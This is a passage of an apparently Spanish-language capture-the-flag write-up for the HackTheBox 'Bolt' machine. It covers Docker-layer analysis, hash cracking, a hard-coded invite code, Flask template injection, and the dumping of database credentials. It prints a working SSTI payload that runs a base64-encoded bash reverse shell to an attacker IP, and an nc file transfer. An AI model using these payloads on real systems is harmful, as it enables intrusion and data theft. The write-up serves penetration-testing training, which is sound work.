(SSH), 80 (HTTP) y 443 (HTTPS).\nPor otro lado, se ve que el servidor está utilizando virtual hosts (listado en el certificado SSL), por lo que podemos poner los dominios bolt.htb y passbolt.bolt.htb en el archivo /etc/hosts.\nEnumeración Si entramos en http://bolt.htb, veremos una página web como la siguiente:\nTenemos además la siguiente página de inicio de sesión:\nPero no tenemos ningunas credenciales potenciales. Aunque hay una página de registro, al enviar el formulario, el servidor devuelve un error 500 Internal Server Error, con lo cual la funcionalidad debe de estar deshabilitada.\nPor la respuesta, se puede deducir que el servidor está utilizando Flask:\n$ curl bolt.htb/register -vd 'username=asdf\u0026email=asdf%40bolt.htb\u0026password=asdf' * Trying 10.10.11.114:80... * Connected to bolt.htb (10.10.11.114) port 80 (#0) \u0026gt; POST /register HTTP/1.1 \u0026gt; Host: bolt.htb \u0026gt; User-Agent: curl/7.79.1 \u0026gt; Accept: */* \u0026gt; Content-Type: application/x-www-form-urlencoded \u0026gt; Content-Length: 49 \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 500 INTERNAL SERVER ERROR \u0026lt; Server: nginx/1.18.0 (Ubuntu) \u0026lt; Date: \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 290 \u0026lt; Connection: keep-alive \u0026lt; \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.\u0026lt;/p\u0026gt; * Connection #0 to host bolt.htb left intact  Esto es porque Flask pone en mayúsculas el estado de respuesta HTTP (en este caso HTTP/1.1 500 INTERNAL SERVER ERROR).\nEl segundo subdominio que tenemos es passbolt.bolt.htb, pero no podemos hacer nada aquí:\nInspeccionando la imagen de Docker Existe una imagen de Docker que podemos descargar de bolt.htb en formato TAR (image.tar):\nPodemos importar la imagen a Docker de la siguiente manera:\n$ docker image load -i image.tar 3fc64803ca2d: Loading layer [==================================================\u0026gt;] 4.463MB/4.463MB 73f2f98bc222: Loading layer [==================================================\u0026gt;] 7.68kB/7.68kB 8f2df5d06a26: Loading layer [==================================================\u0026gt;] 62.86MB/62.86MB a1e4f9dc4110: Loading layer [==================================================\u0026gt;] 57.57MB/57.57MB f0c4120bc314: Loading layer [==================================================\u0026gt;] 29.79MB/29.79MB 14ec2ed1c30d: Loading layer [==================================================\u0026gt;] 6.984MB/6.984MB 68c03965721f: Loading layer [==================================================\u0026gt;] 3.072kB/3.072kB fec67b58fd48: Loading layer [==================================================\u0026gt;] 19.97kB/19.97kB 7fa1531c7420: Loading layer [==================================================\u0026gt;] 7.168kB/7.168kB e45bbea785e3: Loading layer [==================================================\u0026gt;] 15.36kB/15.36kB ac16908b339d: Loading layer [==================================================\u0026gt;] 8.192kB/8.192kB Loaded image: flask-dashboard-adminlte_appseed-app:latest $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE flask-dashboard-adminlte_appseed-app latest 859e74798e6c 6 months ago 154MB  Ahora, podemos ejecutar la imagen en un contenedor de Docker:\n$ docker run --rm -p 5005:5005 -it flask-dashboard-adminlte_appseed-app [2021-10-13 08:44:27 +0000] [1] [DEBUG] Current configuration: config: gunicorn-cfg.py bind: ['0.0.0.0:5005'] ... [2021-10-13 08:44:27 +0000] [1] [INFO] Starting gunicorn 20.0.4 [2021-10-13 08:44:27 +0000] [1] [DEBUG] Arbiter booted [2021-10-13 08:44:27 +0000] [1] [INFO] Listening at: http://0.0.0.0:5005 (1) [2021-10-13 08:44:27 +0000] [1] [INFO] Using worker: sync [2021-10-13 08:44:27 +0000] [15] [INFO] Booting worker with pid: 15 [2021-10-13 08:44:27 +0000] [1] [DEBUG] 1 workers [2021-10-13 08:44:29,656] INFO in run: DEBUG = True [2021-10-13 08:44:29,656] INFO in run: Environment = Debug [2021-10-13 08:44:29,657] INFO in run: DBMS = sqlite:////db.sqlite3  Se puede ver que la imagen está ejecutando Flask en el puerto 5005 del contenedor (se ve después de correrlo la primera vez, luego se añade el parámetro -p 5005:5005 al comando docker run).\nEl contenedor sirve una página web que redirige a un formulario de inicio de sesión:\nEsta vez, somos capaces de registrar un nuevo perfil y acceder a AdminLTE 3:\nNo hay nada interesante en este dashboard. Ahora que el contenedor de Docker está corriendo, podemos ejecutar sh, para ver si hay archivos interesantes:\n$ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ffd733413c3e flask-dashboard-adminlte_appseed-app \"gunicorn --config g…\" 2 minutes ago Up 2 minutes 0.0.0.0:5005-5005/tcp friendly_mcnulty $ docker exec -it ffd733413c3e sh / # ls -la total 108 drwxr-xr-x 1 root root 4096 Oct 13 08:44 . drwxr-xr-x 1 root root 4096 Oct 13 08:44 .. -rwxr-xr-x 1 root root 0 Oct 13 08:44 .dockerenv -rw-r--r-- 1 root root 142 Mar 5 2021 .env drwxr-xr-x 2 root root 4096 Mar 5 2021 __pycache__ drwxr-xr-x 1 root root 4096 Mar 5 2021 app drwxr-xr-x 2 root root 4096 Mar 6 2019 bin -rw-r--r-- 1 root root 1448 Mar 5 2021 config.py -rw-r--r-- 1 root root 16384 Oct 13 08:55 db.sqlite3 drwxr-xr-x 5 root root 360 Oct 13 08:44 dev drwxr-xr-x 1 root root 4096 Oct 13 08:44 etc -rw-r--r-- 1 root root 198 Mar 5 2021 gunicorn-cfg.py drwxr-xr-x 2 root root 4096 Mar 6 2019 home drwxr-xr-x 1 root root 4096 Mar 6 2019 lib drwxr-xr-x 5 root root 4096 Mar 6 2019 media drwxr-xr-x 2 root root 4096 Mar 6 2019 mnt dr-xr-xr-x 187 root root 0 Oct 13 08:44 proc -rw-r--r-- 1 root root 116 Mar 5 2021 requirements.txt drwx------ 1 root root 4096 Mar 5 2021 root drwxr-xr-x 2 root root 4096 Mar 6 2019 run -rw-r--r-- 1 root root 955 Mar 5 2021 run.py drwxr-xr-x 2 root root 4096 Mar 6 2019 sbin drwxr-xr-x 2 root root 4096 Mar 6 2019 srv dr-xr-xr-x 13 root root 0 Oct 13 08:44 sys drwxrwxrwt 1 root root 4096 Oct 13 08:44 tmp drwxr-xr-x 1 root root 4096 Mar 5 2021 usr drwxr-xr-x 1 root root 4096 Mar 6 2019 var / # ls -la app total 24 drwxr-xr-x 1 root root 4096 Mar 5 2021 . drwxr-xr-x 1 root root 4096 Oct 13 08:55 .. -rw-r--r-- 1 root root 1058 Mar 5 2021 __init__.py drwxr-xr-x 1 root root 4096 Mar 5 2021 __pycache__ drwxr-xr-x 1 root root 4096 Mar 5 2021 base drwxr-xr-x 1 root root 4096 Mar 5 2021 home  Podemos encontrar una base de datos SQLite3 y el código fuente de la aplicación de Flask. Podemos transferir estos ficheros a nuestra máquina para analizarlos. Para ello, podemos comprimirlos en un archivo ZIP y después utilizar nc:\n/ # apk update fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz v3.7.3-184-gffd32bfd09 [http://dl-cdn.alpinelinux.org/alpine/v3.7/main] v3.7.3-194-gcddd1b2302 [http://dl-cdn.alpinelinux.org/alpine/v3.7/community] OK: 9054 distinct packages available / # apk add zip (1/1) Installing zip (3.0-r4) Executing busybox-1.27.2-r11.trigger OK: 72 MiB in 27 packages / # zip -r src.zip .env db.sqlite3 *.py requirements.txt app / # nc 192.168.1.37 4444 \u0026lt; src.zip  Desde nuestra máquina, cogemos el archivo ZIP y lo descomprimimos:\n$ nc -nlvp 4444  src.zip Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.1.37. Ncat: Connection from 192.168.1.37:52425. $ unzip src.zip  Ahora somos capaces de ver el contenido de la base de datos SQLite3, pero solamente contiene el usuario que acabamos de crear:\n$ sqlite3 db.sqlite3 SQLite version 3.32.3 Enter \".help\" for usage hints. sqlite\u0026gt; .tables User sqlite\u0026gt; select * from User; 1|asdf|asdf@bolt.htb|$1$wJuqE5Tc$rZXG8CmAsT8YAIfHAJdkr.|| sqlite\u0026gt; .quit  Leyendo los demás archivos, vemos uno llamado .env que contiene una clave secreta:\nDEBUG=True SECRET_KEY=S3cr3t_K#Key DB_ENGINE=postgresql DB_NAME=appseed-flask DB_HOST=localhost DB_PORT=5432 DB_USERNAME=appseed DB_PASS=pass  Y también config.py, que contiene una clave secreta y una dirección de correo (support@bolt.htb):\n# -*- encoding: utf-8 -*- \"\"\" Copyright (c) 2019 - present AppSeed.us \"\"\" import os from decouple import config class Config(object): basedir = os.path.abspath(os.path.dirname(__file__)) # Set up the App SECRET_KEY SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007') # This will create a file in \u0026lt;app\u0026gt; FOLDER SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3') SQLALCHEMY_TRACK_MODIFICATIONS = False MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb' class ProductionConfig(Config): DEBUG = False # Security SESSION_COOKIE_HTTPONLY = True REMEMBER_COOKIE_HTTPONLY = True REMEMBER_COOKIE_DURATION = 3600 # PostgreSQL database SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format( config( 'DB_ENGINE' , default='postgresql' ), config( 'DB_USERNAME' , default='appseed' ), config( 'DB_PASS' , default='pass' ), config( 'DB_HOST' , default='localhost' ), config( 'DB_PORT' , default=5432 ), config( 'DB_NAME' , default='appseed-flask' ) ) class DebugConfig(Config): DEBUG = True # Load all possible configurations config_dict = { 'Production': ProductionConfig, 'Debug' : DebugConfig }  Podemos probar estas claves secretas como contraseñas en bolt.htb y passbolt.bolt.htb, pero ninguna combinación funciona.\nHasta este punto, no hemos conseguido nada aún. Necesitamos analizar la imagen de Docker un poco más.\nSi descomprimimos el archivo TAR, tenemos lo siguiente:\n$ 7z x image.tar $ tree . ├── 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950 │ ├── VERSION │ ├── json │ └── layer.tar ├── 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c │ ├── VERSION │ ├── json │ └── layer.tar ├── 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa │ ├── VERSION │ ├── json │ └── layer.tar ├── 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab │ ├── VERSION │ ├── json │ └── layer.tar ├── 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162 │ ├── VERSION │ ├── json │ └── layer.tar ├── 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b │ ├── VERSION │ ├── json │ └── layer.tar ├── 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad │ ├── VERSION │ ├── json │ └── layer.tar ├── 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf │ ├── VERSION │ ├── json │ └── layer.tar ├── 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json ├── 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77 │ ├── VERSION │ ├── json │ └── layer.tar ├── a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 │ ├── VERSION │ ├── json │ └── layer.tar ├── d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26 │ ├── VERSION │ ├── json │ └── layer.tar ├── image.tar ├── manifest.json └── repositories 11 directories, 37 files  Por otro lado, podemos ver el historial de la imagen de Docker con el siguiente comando:\n$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE flask-dashboard-adminlte_appseed-app latest 859e74798e6c 6 months ago 154MB $ docker history 859e74798e6c IMAGE CREATED CREATED BY SIZE COMMENT 859e74798e6c 7 months ago gunicorn --config gunicorn-cfg.py run:app 3.93kB \u0026lt;missing\u0026gt; 7 months ago sh 8.49kB \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 6B \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 16.4kB \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 6B \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 6.95MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) CMD [\"gunicorn\" \"--config… 0B \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) EXPOSE 5005 0B \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c pip3 install -r requirements.txt 28.3MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c apk --update add python3 py3-pip 53MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) COPY dir:f385c9405a9b189a6… 61.2MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) COPY multi:e0a96f9a5ad90dc… 2.86kB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) ENV FLASK_APP=run.py 0B \u0026lt;missing\u0026gt; 2 years ago /bin/sh -c #(nop) CMD [\"/bin/sh\"] 0B \u0026lt;missing\u0026gt; 2 years ago /bin/sh -c #(nop) ADD file:aa17928040e31624c… 4.21MB  Todos los directorios mostrados con tree contienen capas de la imagen de Docker, que contienen los cambios diferenciales en los archivos al ejecutar cada línea del Dockerfile (más imformación aquí).\nDeberíamos listar los contenidos de todos los layer.tar y ver si existe algo interesante. Primero, vamos a ver si hay algún archivo db.sqlite3 en algún layer.tar:\n$ for dir in `find . | grep layer`; do (7z l $dir | grep -q db\\.sqlite3) \u0026\u0026 echo $dir; done ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar $ 7z l 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:37:51 D.... 0 0 app 2021-03-05 19:45:48 D.... 0 0 app/base 2021-03-05 19:45:45 ..... 0 0 app/base/.wh.forms.py 2021-03-05 19:45:48 ..... 0 0 app/base/.wh.routes.py 2021-03-05 15:11:29 D.... 0 0 app/base/templates 2021-03-05 19:45:55 D.... 0 0 app/base/templates/accounts 2021-03-05 19:45:55 ..... 0 0 app/base/templates/accounts/.wh.register.html 2021-03-05 19:45:09 ..... 0 0 .wh.db.sqlite3 2021-03-05 19:39:12 D.... 0 0 root 2021-03-05 19:46:46 ..... 6 512 root/.ash_history 2021-03-05 19:44:48 D.... 0 0 tmp ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:46:46 6 512 5 files, 6 folders $ 7z l a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:44:04 ..... 16384 16384 db.sqlite3 2021-03-05 19:39:12 D.... 0 0 root 2021-03-05 19:44:29 ..... 6 512 root/.ash_history 2021-03-05 19:41:00 D.... 0 0 tmp ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:44:29 16390 16896 2 files, 2 folders  Si descomprimimos este último layer.tar y vemos los contenidos de la base de datos SQLite3, obtendremos el hash de la contraseña del usuario admin:\n$ cd a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 $ 7z x layer.tar $ sqlite3 db.sqlite3 SQLite version 3.32.3 Enter \".help\" for usage hints. sqlite .tables User sqlite select * from User; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| sqlite .quit  Acceso a la máquina Este hash se puede crackear con john:\n$ echo '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.' \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt [MD5 32/64 X2]) Press 'q' or Ctrl-C to abort, almost any other key for status deadbolt (?) 1g 0:00:00:11 DONE 0.08928g/s 15422p/s 15422c/s 15422C/s deadbolt..deadbeat Use the \"--show\" option to display all of the cracked passwords reliably Session completed  Accediendo a bolt.htb como admin Y obtenemos unas credenciales potenciales (admin:deadbolt). Si probamos a iniciar sesión en bolt.htb, entraremos como admin:\nEsta página web tiene la misma apariencia que la que se encuentra en la imagen de Docker. Esta vez, hay información sensible en una conversación por \u0026ldquo;Direct Chat\u0026rdquo;:\nDe esta conversación, obtenemos nombres de usuario (Alexander Pierce, Sarah Bullock y Eddie). Sarah dice que la demo es solo con invitación. Existe algún problema con el correo y todo parece estar relacionado con la imagen de Docker.\nComo se está hablando sobre demo y e-mail, a lo mejor existen más subdominios. Para enumerar, podemos utilizar gobuster:\n$ gobuster vhost -w $WORDLISTS/dirb/small.txt -u bolt.htb -q Found: demo.bolt.htb (Status: 302) [Size: 219] Found: mail.bolt.htb (Status: 200) [Size: 4943]  Hemos conseguido dos nuevos subdominios para explorar y añadir a /etc/hosts.\nEl siguiente es mail.bolt.htb, que redirige a un formulario de inicio de sesión. Podemos intentar acceder con support@bolt.htb o admin@bolt.htb usando alguna de las contraseñas y claves secretas encontradas anteriormente, pero sin éxito:\nY el otro nuevo subdominio es demo.bolt.htb, que es realmente similar a bolt.htb, o al menos los formularios de inicio de sesión y registro. Sin embargo, esta vez necesitamos un código de invitación para registrarnos (como decía Sarah). Recordemos que el registro en bolt.htb no funcionaba:\nProfundizando aún más en la imagen de Docker Esta página web de demo parece estar programada como la que hay en la imagen de Docker. Después de analizar el código fuente transferido anteriormente desde el contenedor en un archivo ZIP, no se encontró nada útil.\nEn este punto, deberíamos imaginar que hay algo en las capas de la imagen de Docker, que posteriormente fue parcheado por razones de seguridad. Para enumerar, podemos listar las capas que contienen código en Python y descomprimir dichas capas:\n$ for dir in `find . | grep layer`; do (7z l $dir | grep -q \\.py) \u0026\u0026 echo $dir; done ./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar ./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar ./d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar $ for dir in `find . | grep layer | awk -F / '{ print $2 }'`; do (7z l $dir/layer.tar | grep -q \\.py) \u0026\u0026 7z x -o\"$dir\" $dir/layer.tar; done  Ahora que hemos descomprimido las capas con código de Python, podemos buscar por \u0026ldquo;invite\u0026rdquo;:\n$ grep -nri invite . | grep -v Binary ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py:20: invite_code = TextField('Invite Code', id='invite_code' , validators=[DataRequired()]) ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html:72: {{ form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }} ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py:63: code = request.form['invite_code']  Dentro de 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py encontraremos un código de invitación hard-coded (XNSS-HSJW-3NGU-8XTJ), en la función register():\n@blueprint.route('/register', methods=['GET', 'POST']) def register(): login_form = LoginForm(request.form) create_account_form = CreateAccountForm(request.form) if 'register' in request.form: username = request.form['username'] email = request.form['email'] code = request.form['invite_code'] if code != 'XNSS-HSJW-3NGU-8XTJ': return render_template('code-500.html') data = User.query.filter_by(email=email).first() if data is None and code == 'XNSS-HSJW-3NGU-8XTJ': # Check usename exists user = User.query.filter_by(username=username).first() if user: return render_template('accounts/register.html', msg='Username already registered', success=False, form=create_account_form) # Check email exists user = User.query.filter_by(email=email).first() if user: return render_template('accounts/register.html', msg='Email already registered', success=False, form=create_account_form) # else we can create the user user = User(**request.form) db.session.add(user) db.session.commit() return render_template('accounts/register.html', msg='User created please \u0026lt;a href=\"/login\"\u0026gt;login\u0026lt;/a\u0026gt;', success=True, form=create_account_form) else: return render_template('accounts/register.html', form=create_account_form)  Encontrando un SSTI Ahora podemos intentar registrarnos en demo.bolt.htb usando este código de invitación. Y funciona, estamos dentro de otro AdminLTE 3:\nAdemás, tenemos otra cuenta en mail.bolt.htb, que se crea automáticamente. Podemos acceder usando las mismas credenciales:\nSin embargo, no podemos enviar correos porque hay un error en el servicio SMTP.\nLlegamos a otro punto muerto, donde parece que no hay nada más por hacer.\nVemos que en AdminLTE 3 podemos cambiar nuestro nombre de usuario, experiencia y habilidades al pinchar en \u0026ldquo;Settings\u0026rdquo;. Como sabemos que la aplicación está utilizando Flask, podemos intentar realizar un Server-Side Template Injection (SSTI):\nDespués de aplicar los cambios, recibimos un correo de confirmación en mail.bolt.htb:\nSi pinchamos en el enlace, recibiremos otro correo indicando los cambios que hemos realizado. Esta funcionalidad es vulnerable a SSTI, ya que se muestra 49 en vez de {{7*7}}, como habíamos introducido:\nSSTI deriva en ejecución remota de comandos (RCE), por lo que podemos obtener una reverse shell en la máquina con algun payload encontrado en PayloadsAllTheThings.\nPodemos realizar los siguientes pasos:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  El contenido para poner en AdminLTE 3 (campo nombre) es:\n{{cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read()}}  Y después, al confirmar los cambios en el correo, se obtiene una conexión en nc como usuario www-data:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.114. Ncat: Connection from 10.10.11.114:42396. bash: cannot set terminal process group (1009): Inappropriate ioctl for device bash: no job control in this shell www-data@bolt:~/demo$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@bolt:~/demo$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@bolt:~/demo$ export TERM=xterm www-data@bolt:~/demo$ export SHELL=bash www-data@bolt:~/demo$ stty rows 50 columns 158  Enumeración del sistema Existen dos usuarios: clark y eddie, y no podemos listar el contenido de sus directorios personales.\nwww-data@bolt:~/demo$ ls -la /home total 16 drwxr-xr-x 4 root root 4096 Mar 3 2021 . drwxr-xr-x 20 root root 4096 Aug 4 13:07 .. drwxr-x--- 15 clark clark 4096 Feb 25 2021 clark drwxr-x--- 16 eddie eddie 4096 Oct 13 07:01 eddie www-data@bolt:~/demo$ ls -la /home/clark ls: cannot open directory '/home/clark': Permission denied www-data@bolt:~/demo$ ls -la /home/eddie ls: cannot open directory '/home/eddie': Permission denied  Podemos conseguir unas credenciales para acceder a una base de datos de MySQL en el archivo config.py:\nwww-data@bolt:~/demo$ ls -la total 36 drwxr-xr-x 5 www-data www-data 4096 Aug 4 13:06 . drwxr-xr-x 6 root root 4096 Aug 4 13:06 .. -rw-r--r-- 1 www-data www-data 6399 Mar 6 2021 app.py -rw-r--r-- 1 www-data www-data 420 Mar 4 2021 config.py drwxr-xr-x 2 www-data www-data 4096 Mar 6 2021 __pycache__ drwxr-xr-x 3 www-data www-data 4096 Mar 4 2021 static drwxrwxr-x 6 www-data www-data 4096 Mar 5 2021 templates -rw-r--r-- 1 www-data www-data 62 Mar 4 2021 wsgi.py www-data@bolt:~/demo$ cat config.py  \"\"\"Flask Configuration\"\"\" #SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db' SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail' SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY = 'kreepandcybergeek' MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False #MAIL_DEBUG = app.debug MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb'  Ahora podemos acceder a la base de datos boltmail con credenciales bolt_dba:dXUUHSW9vBpH5qRB:\nwww-data@bolt:~/demo$ mysql --user=bolt_dba --password=dXUUHSW9vBpH5qRB --database=boltmail mysql\u0026gt; show tables; +--------------------+ | Tables_in_boltmail | +--------------------+ | user | +--------------------+ 1 row in set (0.00 sec) mysql\u0026gt; describe user; +-----------------+---------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +-----------------+---------------+------+-----+---------+----------------+ | id | int | NO | PRI | NULL | auto_increment | | username | varchar(255) | YES | | NULL | | | password | varchar(255) | YES | | NULL | | | email | varchar(255) | YES | | NULL | | | host_header | varchar(255) | YES | | NULL | | | ip_address | varchar(255) | YES | | NULL | | | email_confirmed | tinyint(1) | YES | | NULL | | | profile_confirm | tinyint(1) | YES | | NULL | | | profile_update | varchar(4096) | YES | | NULL | | +-----------------+---------------+------+-----+---------+----------------+ 9 rows in set (0.00 sec) mysql\u0026gt; select username, password from user; +-------------+------------------------------------+ | username | password | +-------------+------------------------------------+ | admin | $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. | | asdf | $1$KsE5LxFN$Xo2Xo.DRX82fo8D2.fSo/1 | +-------------+------------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; exit  A pesar de haber obtenido el hash de la contraseña de admin, es la misma que se encontró antes.\nPensando en el subdominio passbolt.bolt.htb, podemos explorar por los archivos de configuración de dicho servicio. Podemos encontrar un archivo PHP con credenciales de acceso a la base de datos passboltdb de MySQL (passbolt:rT2;jW7\u0026lt;eY8!dX8}pQ8%):\nwww-data@bolt:~/demo$ cat /etc/passbolt/passbolt.php  \u0026lt;?php /** * ... */ return [ 'App' =\u0026gt; [ // A base URL to use for absolute links. // The url where the passbolt instance will be reachable to your end users. // This information is need to render images in emails for example 'fullBaseUrl' =\u0026gt; 'https://passbolt.bolt.htb', ], // Database configuration. 'Datasources' =\u0026gt; [ 'default' =\u0026gt; [ 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; '3306', 'username' =\u0026gt; 'passbolt', 'password' =\u0026gt; 'rT2;jW7\u0026lt;eY8!dX8}pQ8%', 'database' =\u0026gt; 'passboltdb', ], ], // Email configuration. 'EmailTransport' =\u0026gt; [ 'default' =\u0026gt; [ 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; 587, 'username' =\u0026gt; null, 'password' =\u0026gt; null, // Is this a secure connection? true if yes, null if no. 'tls' =\u0026gt; true, //'timeout' =\u0026gt; 30, //'client' =\u0026gt; null, //'url' =\u0026gt; null, ], ], 'Email' =\u0026gt; [ 'default' =\u0026gt; [ // Defines the default name and email of the sender of the emails. 'from' =\u0026gt; ['localhost@bolt.htb' =\u0026gt; 'localhost'], //'charset' =\u0026gt; 'utf-8', //'headerCharset' =\u0026gt; 'utf-8', ], ], 'passbolt' =\u0026gt; [ // GPG Configuration. // The keyring must to be owned and accessible by the webserver user. // Example: www-data user on Debian 'gpg' =\u0026gt; [ // Main server key. 'serverKey' =\u0026gt; [ // Server private key fingerprint. 'fingerprint' =\u0026gt; '59860A269E803FA094416753AB8E2EFB56A16C84', 'public' =\u0026gt; CONFIG . DS . 'gpg' . DS . 'serverkey.asc', 'private' =\u0026gt; CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc', ], ], 'registration' =\u0026gt; [ 'public' =\u0026gt; false, ], 'ssl' =\u0026gt; [ 'force' =\u0026gt; true, ] ], ];  Ahora, nos podemos conectar a la base de datos con las credenciales encontradas:\nwww-data@bolt:~/demo$ mysql --user=passbolt --password='rT2;jW7\u0026lt;eY8!dX8}pQ8%' --database=passboltdb mysql\u0026gt; show tables; +-----------------------+ | Tables_in_passboltdb | +-----------------------+ | account_settings | | action_logs | | actions | | authentication_tokens | | avatars | | comments | | email_queue | | entities_history | | favorites | | gpgkeys | | groups | | groups_users | | organization_settings | | permissions | | permissions_history | | phinxlog | | profiles | | resource_types | | resources | | roles | | secret_accesses | | secrets | | secrets_history | | user_agents | | users | +-----------------------+ 25 rows in set (0.01 sec) mysql\u0026gt; describe secrets; +-------------+------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------------+------------+------+-----+---------+-------+ | id | char(36) | NO | PRI | NULL | | | user_id | char(36) | NO | MUL | NULL | | | resource_id | char(36) | NO | MUL | NULL | | | data | mediumtext | NO | | NULL | | | created | datetime | NO | | NULL | | | modified | datetime | NO | | NULL | | +-------------+------------+------+-----+---------+-------+ 6 rows in set (0.00 sec) mysql\u0026gt; select * from secrets\\G *************************** 1. row *************************** id: 643a8b12-c42c-4507-8646-2f8712af88f8 